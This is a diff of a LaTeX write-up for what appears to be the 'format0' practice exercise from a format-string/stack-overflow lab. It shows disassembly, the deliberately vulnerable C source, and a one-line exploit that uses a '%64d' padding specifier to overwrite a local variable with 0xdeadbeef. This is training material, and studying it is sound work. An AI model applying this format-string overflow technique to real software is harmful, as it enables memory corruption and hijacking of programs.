@@ -1,9 +1,9 @@
 
-\begin{center}\begin{LARGE} Stack 5\end{LARGE}\end{center}
+\begin{center}\begin{LARGE}Format 0\end{LARGE}\end{center}
  
 \subsection*{Problem}
 
-\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {bash}
+\begin{lstlisting}[language=bash]
 Dump of assembler code for function main:
 0x0804842b <main+0>:    push   ebp
 0x0804842c <main+1>:    mov    ebp,esp
@@ -34,7 +34,7 @@ Dump of assembler code for function vuln:
 0x08048424 <vuln+48>:   call   0x8048330 <puts@plt>
 0x08048429 <vuln+53>:   leave
 0x0804842a <vuln+54>:   ret
-\end{minted}
+\end{lstlisting}
 
 We can see from `<vuln+6>` that the target variable is at `ebp-0xc`. We could solve
 the problem through a buffer overflow by using 64char followed by `0xdeadbeef`
@@ -47,14 +47,14 @@ followed by a numerical digit allows us to inject characters without generating
 them. We can see that the buffer is 64 characters and we inject 64 digits followed
 by the target.
 
-\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {bash}
+\begin{lstlisting}[language=bash]
 ./format0 $(python -c "print '%64d\xef\xbe\xad\xde'")
 >>> you have hit the target correctly :)e
-\end{minted}
+\end{lstlisting}
 
 \subsection*{Source code}
 
-\begin{minted}[ frame=lines, framesep=2mm, baselinestretch=1.2, bgcolor=LightGray, fontsize=\footnotesize, linenos ] {c}
+\begin{lstlisting}[language=c]
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -78,4 +78,4 @@ int main(int argc, char **argv)
 {
   vuln(argv[1]);
 }
-\end{minted}
+\end{lstlisting}
